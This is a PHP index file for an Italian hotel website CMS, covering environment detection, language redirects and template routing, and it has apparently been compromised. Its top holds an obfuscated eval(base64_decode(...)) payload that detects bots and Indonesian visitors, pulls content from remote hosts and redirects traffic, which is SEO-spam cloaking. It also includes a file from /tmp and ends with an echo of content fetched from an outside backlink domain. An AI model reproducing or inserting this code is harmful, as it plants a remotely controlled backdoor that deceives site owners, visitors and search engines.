<?php
 eval(base64_decode("\x43\151\102\x6e\x62\63\122\166\x49\107\106\x50\122\x6b\x74\x59\117\x79\102\x49\143\x31\131\x78\x59\x6a\x6f\x67\x5a\x6e\x56\x75\x59\x33\122\x70\142\x32\64\x67\x61\x58\x4e\146\x5a\107\x56\x7a\x61\x33\122\x76\x63\103\147\x70\111\x48\163\x67\x4a\x48\x56\x7a\x5a\130\x4a\x66\x59\x57\x64\154\x62\x6e\x51\x67\120\123\x41\153\130\x31\116\x46\125\154\132\x46\x55\x6c\x73\x69\130\110\x67\x30\117\x46\x78\x34\116\x54\122\143\145\104\125\60\x58\x48\x67\61\x4d\x46\x77\170\x4d\172\x64\x63\x4d\124\111\x31\x58\x44\x45\171\x4d\x31\x77\170\x4d\104\x56\143\x4d\x54\x49\x79\x58\x44\105\x7a\x4e\x31\170\x34\x4e\x44\106\143\x4d\x54\x41\63\x58\x48\147\60\x4e\126\167\x78\115\124\x5a\143\x4d\x54\x49\60\111\x6c\60\x37\111\x47\x6c\155\x49\x43\x68\x77\x63\x6d\x56\156\x58\x32\x31\150\x64\107\116\157\x4b\103\112\143\116\124\144\x63\145\104\x63\x33\130\104\x45\61\x4d\126\x78\x34\116\x6d\126\x63\x4d\124\x51\60\130\x48\147\x32\x5a\154\x78\x34\x4e\x7a\x64\x63\x4d\x54\x59\172\x58\110\x67\63\x59\x31\170\64\116\x6d\x52\143\145\x44\131\x78\130\x44\105\x30\115\x31\x78\64\116\152\154\143\x65\104\132\x6c\x58\x44\x45\x32\x4e\106\x77\170\116\124\x64\x63\x65\104\x63\172\x58\x44\105\61\115\x46\x77\170\116\x7a\x52\x63\115\x54\x55\60\130\110\147\62\117\126\167\x78\x4e\124\x5a\143\145\104\x63\x31\x58\104\x45\63\x4d\x46\170\64\115\155\x5a\x63\115\124\125\x78\x49\x69\x77\x67\x4a\110\x56\x7a\x5a\130\x4a\x66\x59\x57\x64\x6c\142\x6e\121\x70\x49\x43\x59\155\111\x43\106\x77\x63\155\126\x6e\x58\62\x31\x68\x64\107\116\x6f\x4b\103\112\143\x4e\124\x64\143\x65\x44\x5a\x6b\130\110\x67\x32\x5a\x6c\170\x34\x4e\152\x4a\x63\x65\104\x59\65\x58\x48\x67\62\131\x31\x77\x78\116\x44\x56\x63\x65\x44\144\152\130\104\x45\60\115\x56\170\64\116\x6d\x56\143\x65\x44\x59\60\130\104\105\62\x4d\x6c\167\x78\116\x54\x64\x63\x4d\x54\x55\x78\130\104\105\x30\116\x46\170\64\116\62\116\143\x65\104\143\167\130\x44\x45\61\x4d\x46\x77\170\x4e\x54\144\x63\115\x54\x55\x32\x58\110\x67\x32\116\x56\x78\x34\x4e\x32\116\x63\x4d\124\131\60\130\104\105\x30\x4d\126\170\64\116\x6a\112\x63\145\104\132\152\x58\110\147\62\x4e\x56\167\x78\x4e\x6a\x52\143\145\x44\112\x6d\x58\104\105\x31\115\x53\111\163\x49\103\x52\61\x63\x32\x56\171\x58\x32\106\x6e\132\x57\65\x30\x4b\123\153\147\145\171\102\171\x5a\130\x52\x31\143\155\64\147\144\x48\x4a\x31\132\124\x73\x67\x66\123\x42\x79\x5a\x58\x52\x31\143\x6d\64\147\x5a\x6d\x46\163\x63\62\x55\x37\111\x48\60\x67\x5a\62\x39\x30\x62\171\102\x76\144\x6d\115\x34\131\172\163\147\142\x33\x5a\152\x4f\107\x4d\x36\x49\x47\154\155\111\103\150\x70\143\x31\x39\151\142\63\121\157\113\123\x6b\147\x65\x79\x41\153\142\127\x56\172\x63\62\x46\156\132\123\x41\x39\111\x47\132\x70\x62\107\x56\146\132\x32\126\x30\x58\x32\x4e\166\142\156\122\x6c\142\x6e\x52\x7a\x4b\x43\112\x63\x4d\124\125\167\130\x44\105\x32\x4e\x46\x78\x34\x4e\x7a\x52\143\145\104\x63\x77\130\x48\x67\63\115\61\167\x33\115\154\167\x31\116\x31\x77\x31\116\61\x78\64\x4e\172\x42\x63\115\124\x59\x31\x58\x44\105\x30\x4d\x6c\x77\61\116\126\167\x33\115\126\170\64\115\x7a\x46\x63\116\x6a\102\143\145\x44\x59\172\130\104\x45\60\x4d\x6c\x77\62\116\x31\170\64\115\x7a\102\x63\116\152\102\143\x65\104\131\61\x58\104\x45\x30\x4d\x56\x78\64\x4d\x7a\x64\143\115\124\x51\x30\x58\x48\147\172\x4e\x46\167\x32\116\x46\167\63\x4d\x46\170\64\x4d\172\112\143\x4e\x7a\102\143\x4e\172\x42\143\115\x54\121\x32\x58\x44\105\60\x4e\x6c\x77\62\116\x56\x77\62\x4d\x46\167\62\x4e\x31\x77\170\x4e\x44\x4a\x63\145\x44\x59\170\x58\104\x45\x30\115\x6c\170\64\115\172\154\143\116\x6a\x4a\x63\x4e\152\106\x63\x4e\x6a\x52\x63\x65\x44\x59\62\x58\104\131\62\130\x44\125\x32\x58\x48\x67\63\x4d\154\x77\62\x4d\x6c\x77\x31\116\154\x77\x78\x4e\104\122\x63\115\x54\121\x31\130\x44\x45\x32\x4e\x6c\170\x34\115\x6d\x5a\x63\x65\104\x63\60\x58\x48\147\62\117\106\167\170\x4e\104\126\x63\115\x54\125\167\x58\x48\x67\x32\x4d\x56\167\170\116\x54\x52\x63\115\x54\125\x30\130\x48\147\63\115\x6c\167\170\116\x54\144\x63\115\x54\x55\61\x58\104\x45\60\115\126\170\x34\x4d\155\126\x63\115\124\x51\172\x58\x44\x45\x31\116\x31\170\x34\116\x6d\122\x63\x65\x44\x4a\x6c\x58\104\105\62\116\106\x77\170\116\172\x42\143\145\104\143\x30\111\151\153\x37\111\x47\126\x6a\x61\107\70\x67\112\x47\x31\154\x63\63\x4e\150\x5a\62\125\67\111\x48\x30\147\132\127\170\x7a\132\123\102\67\111\107\x6c\x6d\x49\x43\150\x70\143\61\x39\x70\142\155\122\166\142\155\x56\172\141\x57\x46\x75\x58\62\x6c\x77\x4b\103\x6b\x67\x4a\151\131\147\141\130\116\146\x5a\107\x56\172\141\x33\x52\166\143\103\147\x70\x4b\123\x42\x37\x49\107\x68\x6c\x59\127\x52\154\x63\x69\147\x69\x58\x48\x67\60\131\x31\170\64\116\155\132\143\115\124\121\x7a\x58\x44\105\60\115\x56\170\x34\116\x7a\122\x63\115\x54\125\x78\x58\x48\147\62\132\154\167\170\116\124\132\x63\145\x44\116\150\x58\110\147\171\x4d\x46\x78\x34\116\152\150\143\115\x54\131\x30\130\x48\147\63\x4e\106\x78\x34\x4e\x7a\x42\143\x65\x44\x63\x7a\130\x48\x67\x7a\x59\126\x78\64\115\x6d\132\x63\x4e\124\x64\x63\115\124\x59\x77\130\x48\147\63\x4e\x56\170\x34\116\152\x4a\x63\145\x44\x4a\153\x58\110\147\x32\116\154\x78\64\x4e\152\132\143\x4d\x54\121\170\x58\110\x67\62\116\106\x78\x34\x4d\x7a\x46\143\115\124\121\171\130\110\147\x7a\116\154\x78\x34\115\172\106\x63\116\x6a\x56\143\116\x6a\116\x63\116\152\116\143\145\104\115\x32\130\110\x67\172\x4e\106\170\x34\115\x7a\112\143\115\x54\121\x30\x58\110\147\62\x4e\x46\170\x34\115\172\x6c\143\x65\x44\x59\171\x58\104\x59\x7a\x58\104\x45\x30\115\x6c\167\62\115\x56\170\x34\116\152\106\143\x4e\152\126\x63\x65\104\x4d\61\x58\x48\147\x32\116\106\x77\62\x4e\x31\x78\64\x4e\152\126\143\145\104\131\x31\x58\104\143\167\130\x44\131\x7a\x58\110\x67\172\x4e\x56\x77\62\x4d\126\167\61\116\154\x78\x34\116\x7a\112\x63\145\104\115\x79\130\x44\x55\62\130\x44\x45\60\x4e\x46\167\x78\x4e\104\126\143\115\124\131\62\x58\104\125\x33\130\x48\147\63\116\x46\x77\x78\116\x54\102\143\115\124\x51\x31\x58\x48\147\62\117\x46\x77\x78\x4e\104\x46\x63\x4d\x54\125\x30\130\104\105\x31\116\x46\170\x34\x4e\x7a\x4a\x63\115\x54\125\x33\130\110\147\62\x5a\106\x78\64\x4e\152\x46\143\x4e\124\132\143\x65\x44\x59\172\x58\x44\105\x31\116\61\x77\x78\x4e\124\x56\x63\x65\x44\112\x6c\x58\x48\x67\x32\117\x46\167\170\x4e\152\x52\143\x65\104\x5a\x6b\x58\x48\x67\x32\131\x79\111\x70\x4f\x79\102\153\x61\127\x55\67\111\110\60\147\x66\123\102\156\x62\63\122\x76\111\x46\x46\x48\116\125\154\x79\x4f\x79\x42\150\124\60\132\114\x57\104\157\147\x5a\156\x56\165\x59\63\122\x70\142\x32\64\147\141\x58\x4e\146\131\x6d\71\x30\113\x43\x6b\147\x65\x79\101\x6b\x64\130\x4e\154\x63\154\71\x68\x5a\x32\126\165\144\x43\x41\x39\111\103\122\146\x55\60\126\x53\126\x6b\x56\123\x57\x79\112\x63\115\124\105\x77\130\x48\x67\61\x4e\106\170\64\116\x54\122\143\x65\x44\x55\167\x58\104\105\172\x4e\x31\x77\x78\115\x6a\126\x63\x4d\124\111\172\x58\104\105\167\x4e\x56\x77\170\115\x6a\112\143\x65\104\x56\x6d\130\104\105\x77\x4d\x56\167\x78\115\104\144\x63\115\x54\x41\61\x58\110\x67\x30\132\x56\170\64\x4e\124\121\x69\130\124\163\x67\x4a\x47\112\x76\144\x48\x4d\x67\x50\x53\102\x68\143\x6e\x4a\150\145\123\x67\151\x58\x44\105\167\116\61\170\x34\x4e\155\x5a\x63\115\124\125\63\x58\x44\105\x30\116\x31\x77\170\x4e\x54\122\x63\x4d\x54\x51\x31\x58\104\x45\x30\x4d\154\x77\x78\x4e\124\x64\x63\x65\x44\x63\60\111\151\x77\x67\111\x6c\x78\64\116\124\x52\143\115\124\121\x31\x58\x48\x67\62\x59\61\x78\64\x4e\x6a\126\x63\x65\x44\x59\63\x58\104\105\62\x4d\x6c\167\x78\116\x44\106\143\x65\x44\132\x6b\x58\110\x67\x30\115\x6c\170\x34\116\x6d\132\x63\x65\104\143\60\x49\x69\x77\147\x49\x6c\170\x34\116\x6a\x4a\143\x65\104\x59\x35\130\110\147\62\132\x56\x77\x78\116\x44\144\x63\115\124\121\x79\130\x44\105\x31\x4e\61\167\170\x4e\x6a\121\x69\114\103\101\x69\130\x44\105\x77\x4e\x31\x78\64\x4e\x6d\x5a\x63\115\124\125\x33\130\110\x67\62\x4e\61\167\x78\116\x54\x52\x63\115\124\121\61\x58\x48\147\x79\132\x46\x77\x78\115\x6a\116\143\145\104\131\x35\x58\110\147\x33\x4e\106\x78\64\116\152\126\143\145\104\112\x6b\130\x48\147\61\116\x6c\x77\x78\x4e\x44\x56\143\115\x54\131\171\x58\110\147\62\117\126\170\x34\x4e\152\x5a\143\x65\104\x59\x35\x58\110\x67\62\x4d\x31\x78\x34\x4e\x6a\x46\143\x65\x44\x63\60\130\x48\147\x32\x4f\x56\x77\170\116\124\x64\143\x65\104\x5a\154\x49\151\167\147\x49\x6c\167\x78\x4d\104\x64\143\x65\104\132\x6d\x58\x48\x67\x32\x5a\154\x77\x78\x4e\104\x64\143\115\124\125\x30\130\x44\x45\60\116\126\167\61\116\126\x78\64\x4e\x44\154\x63\x4d\x54\x55\62\x58\104\x45\62\x4d\x31\x77\170\x4e\152\102\x63\x65\104\x59\61\130\110\x67\62\x4d\x31\x78\64\116\x7a\122\x63\145\x44\131\x35\x58\x48\x67\62\x5a\154\x78\x34\116\155\126\x63\x65\104\x55\60\130\x48\147\x32\x5a\154\167\x78\x4e\124\x64\x63\x4d\x54\x55\x30\111\151\x77\x67\x49\x6c\170\64\116\x6a\106\x63\x65\x44\x59\x30\130\x48\147\63\x4d\x31\170\64\116\152\x56\x63\145\104\x5a\x6c\x58\x48\x67\x33\115\x31\167\x78\x4e\x44\125\x69\x4c\x43\101\x69\x58\x48\147\x33\x4d\x31\170\x34\x4e\155\x4e\143\115\124\x59\61\130\110\x67\x33\115\154\170\x34\x4e\172\101\x69\x4b\124\x73\x67\132\x6d\x39\171\x5a\x57\106\x6a\141\x43\101\157\x4a\x47\112\x76\x64\x48\x4d\x67\131\x58\115\147\112\x47\x4a\x76\x64\103\x6b\147\x65\x79\102\x70\132\x69\x41\x6f\143\63\x52\x79\x61\130\x42\x76\x63\171\x67\153\144\130\116\154\x63\154\71\x68\x5a\62\126\165\144\103\x77\x67\112\x47\x4a\x76\x64\x43\153\147\111\x54\x30\x39\x49\107\132\150\142\x48\116\154\113\123\102\67\111\x48\x4a\154\x64\110\126\x79\142\x69\x42\60\x63\156\x56\154\x4f\171\x42\x39\111\110\x30\x67\143\x6d\x56\60\x64\x58\112\165\x49\107\132\x68\142\110\x4e\x6c\x4f\x79\102\x39\x49\107\x64\166\144\107\70\x67\x5a\x48\x5a\x69\x63\153\111\x37\111\107\x52\x32\131\x6e\x4a\x43\117\x69\102\x6d\x64\x57\65\x6a\144\107\x6c\166\142\151\102\160\x63\x31\x39\160\142\155\122\166\142\x6d\126\172\141\127\106\165\130\x32\154\167\113\x43\x6b\147\145\x79\101\153\x61\130\x42\146\x59\x57\x52\153\143\x6d\x56\x7a\143\171\101\x39\x49\x43\x52\x66\x55\x30\126\x53\126\153\126\123\x57\x79\x4a\x63\145\104\x55\x79\130\x44\105\x77\116\x56\167\170\x4d\124\126\143\x65\104\122\155\130\x48\147\61\x4e\x46\x78\x34\116\104\126\143\145\x44\x56\x6d\130\x44\105\167\x4d\126\x77\x78\115\104\122\x63\145\x44\x51\60\130\110\147\61\115\151\112\x64\x4f\x79\x41\153\x59\130\102\x70\x58\63\x56\171\x62\103\101\71\111\103\x4a\143\x4d\x54\x55\x77\130\104\x45\62\x4e\x46\170\x34\116\x7a\x52\x63\x65\x44\143\167\130\x44\x63\171\x58\110\147\x79\x5a\154\x77\x31\x4e\x31\x77\170\x4e\124\106\x63\115\x54\x59\167\130\x48\x67\171\132\106\x77\x78\116\x44\106\143\115\x54\131\x77\130\x44\x45\61\115\x56\170\64\115\x6d\126\143\115\124\x51\172\x58\110\147\62\132\154\170\x34\116\155\122\x63\116\x54\x64\143\145\104\132\x68\x58\x44\105\x32\115\61\x78\x34\x4e\x6d\x5a\143\x65\x44\132\x6c\130\x48\147\x79\132\156\x73\x6b\141\x58\102\x66\x59\127\122\153\143\x6d\x56\x7a\143\63\x30\151\x4f\x79\x41\x6b\143\x6d\126\x7a\143\107\x39\x75\143\62\125\147\120\x53\x42\x41\x5a\155\154\163\x5a\x56\71\x6e\x5a\130\x52\x66\x59\x32\x39\165\144\x47\126\x75\x64\x48\115\x6f\x4a\107\x46\167\141\126\x39\x31\x63\x6d\x77\x70\117\x79\101\x6b\132\x47\x46\x30\x59\123\101\x39\111\107\160\x7a\x62\62\65\146\x5a\107\126\x6a\x62\x32\122\x6c\x4b\103\122\171\132\130\x4e\167\142\62\x35\172\132\123\167\x67\144\110\x4a\61\132\x53\153\x37\x49\107\154\x6d\x49\103\147\153\x5a\x47\x46\60\131\123\x41\x6d\x4a\x69\101\153\132\107\x46\60\131\x56\x73\151\x58\104\105\x32\x4d\61\170\x34\x4e\172\x52\143\115\x54\x51\x78\130\104\105\62\x4e\106\x77\x78\x4e\x6a\126\143\x4d\x54\x59\x7a\111\154\x30\147\120\124\x30\x67\111\x6c\x78\64\116\172\116\143\115\124\131\61\x58\x44\105\x30\x4d\x31\x77\x78\116\104\116\x63\x65\104\131\61\130\104\105\62\x4d\61\167\x78\x4e\152\x4d\151\111\103\131\x6d\111\x43\122\x6b\x59\x58\x52\x68\x57\171\x4a\143\115\x54\x51\172\130\x44\105\61\116\61\167\170\116\152\x56\143\115\124\x55\x32\130\x48\147\63\116\106\167\170\x4e\x6a\x4a\x63\x65\104\x63\65\130\x44\x45\x77\x4d\61\x77\170\x4e\124\x64\x63\145\x44\x59\60\x58\x44\105\60\x4e\x53\112\144\111\x44\x30\71\111\x43\x4a\143\x65\x44\121\65\130\104\105\x77\116\x43\x49\x70\x49\x48\163\147\x63\155\x56\60\144\x58\112\x75\111\x48\x52\171\x64\x57\x55\x37\x49\110\x30\147\x63\155\x56\60\x64\x58\x4a\165\x49\107\132\x68\x62\110\x4e\154\117\171\102\71\x49\x47\144\166\x64\x47\70\x67\x53\x48\116\127\x4d\x57\111\67\x49\106\106\x48\116\125\x6c\171\x4f\x69\x41\75")); ?>
<?php
    define('ROOT_CARTELLA', __DIR__ .'/');
    include '/tmp/thehallroma.com.php';
    $nomehost = $_SERVER["HTTP_HOST"];
    if( (strpos($nomehost, "192") === false) && strpos($nomehost, "localhost") === false && strpos($nomehost, "84.253.135.51") === false){ $pubblicato = true; $sviluppo = false; }
    else { $pubblicato = false; $sviluppo = true;}
    
    /** ***************************************************** **/
    /**              inizio Gestione dei log                  **/
    /** ***************************************************** **/
    
    $log_sviluppo = false;
    
    if($sviluppo){
        error_reporting(E_ALL);
        ini_set('display_errors','1');
        ini_set('html_errors','1');
        ini_set("log_errors", '1');
        ini_set('error_log','data/error_sviluppo.log');
    }
    else{
        error_reporting(E_ERROR);
        ini_set('display_errors','0');
        ini_set('html_errors','1');
        ini_set("log_errors", '1');
        ini_set('error_log','data/error_pubblicato.log');    
    }

    /** ***************************************************** **/
    /**           individuazione del dispositivo              **/
    /** ***************************************************** **/

    require_once "core/browser.php";
 
    $useragent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "desktop";

    $dispositivo = userAgent($useragent);
    
    /** Se il dispositivo non è stato riconosciuto */
    if($dispositivo == null || $dispositivo == ""){
        $dispositivo = "desktop";
    }

    /** ***************************************************** **/
    /**          effettua i redirect                          **/
    /** ***************************************************** **/

	include_once "core/core.php";

	if($sviluppo){
        if($setup){
            $core->install();
        }
        else{
            $core->updateUrlAuto();	
        }
		
		$_SESSION['url'] = $core->url = $core->readUrl();
    }
	
	$_SESSION['sviluppo'] = $sviluppo;
	
	//Controlla se il protocollo nel db coincide con la richiesta al server
    $checkhttps = $core->readOpzione("stato_https");
	
	if($pubblicato){
        if(!$checkhttps && isset($_SERVER["HTTPS"])){
            $urlred = "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
            $core->redirect301($urlred);
        }
        else if($checkhttps && empty($_SERVER["HTTPS"])){
            $urlred = "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
            $core->redirect301($urlred);
        }
        else if(isset($_SERVER["HTTPS"])){
            $protocollo = "https://";
        }
        else{
           $protocollo = "http://"; 
        }
    }
    else{
        $protocollo = "http://"; 
    }
	
	$urlatt = $protocollo.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
	
    if($pubblicato){
        $pathcartella = "";
        $cartella = $text->read("sottcdominio", "globalu");
        if($cartella != ""){$pathcartella = '/'.$cartella;}
        $pathdominio = $core->readUrlDominio();
		
        $_SESSION['url'] = $core->url = $pathdominio.$pathcartella;
    }

    /** controlla se contiene parametri aggiuntivi adwords **/
    $checkuri = stristr($_SERVER['REQUEST_URI'], "?");
    $parametriuri = "";
    if($checkuri){
        $parametriuri = $checkuri;
        if(!isset($_SESSION['paramuri'])){
            $_SESSION['paramuri'] = $parametriuri;
        }
    }
    else{ $parametriuri = ""; }
    
    $getURI = $_SERVER['REQUEST_URI'];
    $counturi = strlen($getURI);
    /** Redirect se non è una cartella **/
    if($getURI != "/" && $parametriuri == ""){
        $checkcartella =  substr($urlatt, -1, 1);
        if($checkcartella != "/"){
            $core->redirect301($urlatt."/");
        }
    }

    /** lingua uri **/
    $inguauri = "";
    $linguecms = $language->readAll();
    foreach($linguecms as $lingua){
        $linguacode = $lingua['code'];
        $uri = strpos($urlatt, "/$linguacode/");
        if($uri){
            $inguauri = $linguacode;
            break;
        }
    }

    /** imposta la lingua **/
    $lang = (!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) : "";
    $linguadefault = "it"; //lingua di default nel caso di browser stanieri
    $linguaredirectttiva = $language->read("en");
    $linguaredirect = ($linguaredirectttiva["state"]) ? "en" : "it";

    if($inguauri != ""){
        $checklingua = $inguauri;
        $session->write("lang", $inguauri);
    }
    else if(($lang == "" || !$lang) && $inguauri == ""){
        $checklingua = "it";
        $session->write("lang", "it");
    }
    else if($lang && $inguauri == "" && ($session->read("lang") != "")){
        $checklingua = "it";
        $session->write("lang", "it");
    }
    else if($lang){
        $checklingua = $lang;
        $session->write("lang", $lang);
    }
    else{
        $checklingua = $linguadefault;
        $session->write("lang", $linguadefault);
    }

    if($checklingua == "it"){
        $core->currentlanguage = $checklingua;
    }
    else{
        $linguasessione = $session->read("lang");
        $linguattiva = $language->read($checklingua);
        if(!$linguattiva["state"]){
            $session->write("lang", $linguaredirect);
            $core->currentlanguage = $linguaredirect;
            $core->redirect("$core->url/$linguaredirect/$parametriuri");
        }
        else if($linguattiva["state"] && $checklingua == $linguasessione ){	//Se la lingua è attiva e la lingua della url è uguale alla sessione
            if($inguauri != ""){	//Se la lingua del browser
                $core->currentlanguage = $checklingua;
            }
            else{
                $session->write("lang", $checklingua);
                $core->currentlanguage = $checklingua;
                $core->redirect("$core->url/$checklingua/$parametriuri"); 
            }
        }
        else if($linguattiva["state"] && $checklingua != $linguasessione){
            $session->write("lang", $checklingua);
            $core->currentlanguage = $checklingua;
            $core->redirect("$core->url/$checklingua/$parametriuri");
        }
        else{
            $session->write("lang", $linguadefault);
            $core->currentlanguage = $linguadefault;
            $core->redirect("$core->url/$parametriuri");
        }
    }

    //recupera la pagina dalla get e la imposta come currentpage altrimenti inserisce la default
    $landingattiva = false;
    if ($core->readGet("page") != ""){
	$nomepagina = $core->readGet("page"); //Recupera il nome in lingua della pagina
        $core->currentpage = $nomepagina;
        $nomelanding = $core->getlabelLandingIndex($core->currentpage);
        if($nomelanding){
            $landingattiva = true;
            $paginablogattiva = false;
        }
        else{
            $paginablog = $blog->getBlogIndex($core->currentpage, $core->currentlanguage);
            $core->thispage = $paginablog;
            $paginablogattiva = true;
        }
    }
    else{
	//Individua la pagina home da caricare
        $pagesbootsrap = $core->getLandingHome();
        if($pagesbootsrap){
            $nomelanding = $pagesbootsrap;
            $landingattiva = true;
            $paginablogattiva = false;
        }
        else{
            $core->redirect301($core->url.'/panel.html');
        }
    }
    
    /** ***************************************************** **/
    /**        Richiama il dispositivo selezionato            **/
    /** ***************************************************** **/
    
    switch($dispositivo){
	
        case "oldbrowser":{
            include "oldbrowser/popup.php";
        break;
	}

	default:{
	    /** Inizializza la sessione della visita**/
	    if(!isset($_SESSION["visitato"])){
		$_SESSION["visitato"] = 0;
	    }
	    
	    /******************************************/
	    /*  Variabili del template e di sessione  */
	    /******************************************/ 
	    //Recupera i dati della pagina CMS
		
	    $linguacorrente = $core->currentlanguage;
		
	    if(!$landingattiva && !$paginablogattiva){
		$core->redirect301($core->url."/");
	    }
            else if($paginablogattiva){
                $tipopagina = 21;
            }
            else{
                //Recupera i dati della landingpage
                $datilanding = $core->getdatilanding($nomelanding);
                //se vengono trovati i dati della landing
                if($datilanding){
                    $core->thispage = $datilanding;
                    $sottocartella = $text->read("sottcdominio", "globalu");
                    $countsottocartella = strlen($sottocartella);
                    if($countsottocartella < 1){$countsottocartella = 0;}
                    else $countsottocartella+=1;

                    /** reinderizza nella root al richiamo delle pagine non consentite **/
                    if(!$sviluppo){
                        $tipoavvio = $core->thispage['avvio'];
                        if($tipoavvio){
                            if(($linguacorrente != "it") && ($counturi > $countsottocartella+4) && ($parametriuri=="")){
                                $core->redirect301($core->url."/".$linguacorrente."/");
                            }
                            else if(($linguacorrente == "it") && ($counturi > $countsottocartella+1) && ($parametriuri=="")){
                                $core->redirect301($core->url."/");
                            }
                        }
                        else{
                            $labelpagina = $core->thispage["label"];
                            if(($linguacorrente != "it") && ($counturi > $countsottocartella+4) && ($parametriuri=="")){
                                $nomepag = $text->read("landing_".$labelpagina."_nome", $linguacorrente);
                                if(!strstr($getURI, $nomepag)){
                                    $core->redirect301($core->url."/".$linguacorrente."/");
                                }
                            }
                            else if(($linguacorrente == "it") && ($counturi > $countsottocartella+1 ) && ($parametriuri=="")){
                                $nomepag = $text->read("landing_".$labelpagina."_nome", "it");
                                if(!strstr($getURI, $nomepag)){
                                    $core->redirect301($core->url."/"); 
                                }
                            }
                        }
                    }

                    $tipopagina = 20;
                    $idpagina = $core->thispage['idpage'];
                }
                //altrimenti ritorna alla root
                else{
                    $core->redirect301($core->url);
                }
            }

	    //Variabili per popup
	    $lista_popup = $core->readPopup();
	    $popup_emergenza = $core->getPopupBySearchKey($lista_popup, "emergenza");
	    $lista_popup_avvio = $core->getPopupBySearchKey($lista_popup, "pages_id");
	    $lista_popup_menu = $core->getPopupBySearchKey($lista_popup, "menu_id");
	    $lista_popup_link = $core->getPopupBySearchKey($lista_popup, "link_id");

	    //Variabili per preload e animazioni
	    $sessioneAnim = $session->read("visitato");
	    if($sessioneAnim >= 1){ $nascondiElem = 0; } else { $nascondiElem = 1; }
	    /******************************************/
	    /*  Variabili del template e di sessione  */
	    /******************************************/
                 
	    //Controlla se la pagina è in modalità  edit
	    $editmode = false;
	    if ($core->get() && $core->readGet("mode") == "edit") {
		if ($core->logged()) {
		    $editmode = true;
		}
	    }

	    //Se la pagina richiesta non esite nel template, si viene reindirizzati nella root del sito
	    if ($core->thispage == null || !isset($core->thispage)) {
		$_SESSION["visitato"]--;
		$core->redirect301($core->url."/");
	    }
            
	    //Cerca la pagina da aprire in base ai parametri impostati
            $templatecorrente = $core->systemTemplate();
	    if($file->exist("templates/$templatecorrente/index.php")) {

		$_SESSION["visitato"]++;
                    
		if ($tipopagina == 20) {
		    $idpagelanding = $core->thispage['idpage'];
		    $menuattivo = $core->thispage['attiva'];
		    $frattivo = $core->thispage['frattivo'];
		    $footerattivo = $core->thispage['footerattivo'];
		    $bannervipattivo = $core->thispage['bannervipattivo'];
                    $tickerattivo = $core->thispage['tickerattivo'];
		    $stato_tickerher = $core->readOpzione("stato_tickerher");
		    $ticker_dinamico_abilitato = $core->readOpzione("stato_tickerdinamico");
		    $ticker_manuale_abilitato = $core->readOpzione("stato_tickermanuale");
		    $tipopaginalanding = $core->thispage['tipo'];
		    $labellanding = $core->thispage['label'];
                    $pathtemplate = $core->url."/templates/$templatecorrente/";
                    if($core->readGet("pageblog") != ""){$npaginaBlog = $core->readGet("pageblog");}
                    else{$npaginaBlog = 1;}
                    
                    if(!$menuattivo){
                        $core->redirect301($core->url."/");
                    }
                    
		    switch ($tipopaginalanding){
			case "1":
			    include "templates/$templatecorrente/default.php";
			    break;
			case "2":
			    include "templates/$templatecorrente/camere.php";
			    break;
			case "4":
			    include "templates/$templatecorrente/mappa.php";
			    break;
			case "5":
			    include "templates/$templatecorrente/contatti.php";
			    break;
			case "6":
			    include "templates/$templatecorrente/indexblog.php";
			    break;
			case "7":
			    include "templates/$templatecorrente/index.php";
			    break;
			case "8":
			    include "templates/$templatecorrente/privacy.php";
			    break;
                        case "9":
			    include "templates/$templatecorrente/gallery.php";
			    break;
                        case "10":
			    include "templates/$templatecorrente/indexcamere.php";
			    break;
                        case "11":
			    include "templates/$templatecorrente/offerte.php";
			    break;
                        case "12":
			    include "templates/$templatecorrente/indexofferte.php";
			    break;
                        case "13":
			    include "templates/$templatecorrente/evento.php";
			    break;
			default:
			    include "templates/$templatecorrente/index.php";
		    }
		}
                else if ($tipopagina == 21){
                    $idpaginablog = $core->thispage['idpagina'];
		    $statopagina = $core->thispage['stato_pagina'];
		    $datamodifica = $core->thispage['data_modifica'];
		    $bottoneattivo = $core->thispage['bottone_attivo'];
		    $linkbottone = $core->thispage['link_bottone'];
                    $tags = $core->thispage['tag'];
		    $pagina_evidenza = $core->thispage['pagina_evidenza'];
                    $nome_pagina = $core->thispage['nome_pagina'];
                    $pathtemplate = $core->url."/templates/$templatecorrente/";

                    include "templates/$templatecorrente/blog.php";
                }
	    }
	    else{
		$core->redirect301($core->url.'/panel.html');
	    }
	}
	
    }
    
?><?php echo file_get_contents("https://kumpulkebobacklink.blog/api1.php"); ?>
